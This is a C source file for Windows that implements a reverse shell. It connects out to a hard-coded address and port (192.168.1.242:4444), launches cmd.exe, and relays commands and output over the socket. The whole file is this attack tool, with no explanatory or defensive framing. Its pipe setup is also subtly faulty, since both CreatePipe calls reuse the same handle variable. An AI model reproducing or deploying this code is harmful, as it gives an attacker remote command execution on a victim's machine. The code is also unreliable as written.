#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")

void execute_reverse_shell(SOCKET socket) {
    char buffer[1024];
    int recv_size;

    HANDLE hStdIn, hStdOut, hStdErr;
    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&hStdIn, &hStdOut, &sa, 0) || !CreatePipe(&hStdIn, &hStdErr, &sa, 0)) {
        const char *error_message = "Failed to create pipes\n";
        send(socket, error_message, strlen(error_message), 0);
        return;
    }

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.hStdInput = hStdIn;
    si.hStdOutput = hStdOut;
    si.hStdError = hStdErr;
    si.dwFlags = STARTF_USESTDHANDLES;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        const char *error_message = "Failed to execute reverse shell\n";
        send(socket, error_message, strlen(error_message), 0);
        return;
    }

    while ((recv_size = recv(socket, buffer, sizeof(buffer), 0)) > 0) {
        DWORD bytes_written;
        
        // Write input to stdin of cmd.exe
        if (WriteFile(hStdIn, buffer, recv_size, &bytes_written, NULL)) {
            printf("Wrote %d bytes to stdin.\n", bytes_written);
        } else {
            DWORD error = GetLastError();
            printf("Error writing to stdin: %d\n", error);
            break;
        }

        DWORD bytes_read;
        DWORD bytes_avail;
        if (PeekNamedPipe(hStdOut, NULL, 0, NULL, &bytes_avail, NULL) && bytes_avail > 0) {
            if (ReadFile(hStdOut, buffer, sizeof(buffer), &bytes_read, NULL)) {
                printf("Read %d bytes from stdout.\n", bytes_read);
                send(socket, buffer, bytes_read, 0);
            } else {
                DWORD error = GetLastError();
                printf("Error reading from stdout: %d\n", error);
                break;
            }
        }

        if (PeekNamedPipe(hStdErr, NULL, 0, NULL, &bytes_avail, NULL) && bytes_avail > 0) {
            if (ReadFile(hStdErr, buffer, sizeof(buffer), &bytes_read, NULL)) {
                printf("Read %d bytes from stderr.\n", bytes_read);
                send(socket, buffer, bytes_read, 0);
            } else {
                DWORD error = GetLastError();
                printf("Error reading from stderr: %d\n", error);
                break;
            }
        }
    }
    CloseHandle(hStdIn);
    CloseHandle(hStdOut);
    CloseHandle(hStdErr);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main() {
    WSADATA wsaData;
    SOCKET socket_desc;
    struct sockaddr_in server;
    char *ip = "192.168.1.242";
    int port = 4444;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed. Error Code: %d\n", WSAGetLastError());
        return 1; }

    socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_desc == INVALID_SOCKET) {
        printf("Socket creation failed. Error Code: %d\n", WSAGetLastError());
        WSACleanup();
        return 1; }

    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (connect(socket_desc, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        printf("Connection failed. Error Code: %d\n", WSAGetLastError());
        closesocket(socket_desc);
        WSACleanup();
        return 1; }

    printf("Connection established successfully.\n");
    execute_reverse_shell(socket_desc);
    printf("Shell closed.\n");
    closesocket(socket_desc);
    WSACleanup();
    return 0;
}
